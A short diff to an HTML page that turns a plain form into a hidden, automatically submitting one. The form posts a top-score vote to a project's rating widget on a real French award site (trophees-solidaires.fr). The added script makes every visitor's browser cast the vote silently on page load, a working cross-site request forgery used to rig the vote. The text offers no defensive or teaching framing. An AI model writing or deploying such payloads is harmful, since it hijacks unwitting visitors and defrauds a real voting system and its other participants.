@@ -1,10 +1,13 @@
 <html>
 <body>
-	<form action="http://www.trophees-solidaires.fr/projets/les-sourires-de-trapaing" method="post">
+	<form id="vote" action="http://www.trophees-solidaires.fr/projets/les-sourires-de-trapaing" method="post" hidden>
 		<input type="text" name="vote" value="100">
 		<input type="text" name="op" value="Taux">
 		<input type="text" name="form_id" value="fivestar_custom_widget">
 		<input type="submit">
 	</form>
 </body>
+<script type="text/javascript">
+	document.getElementById("vote").submit();
+</script>
 </html>
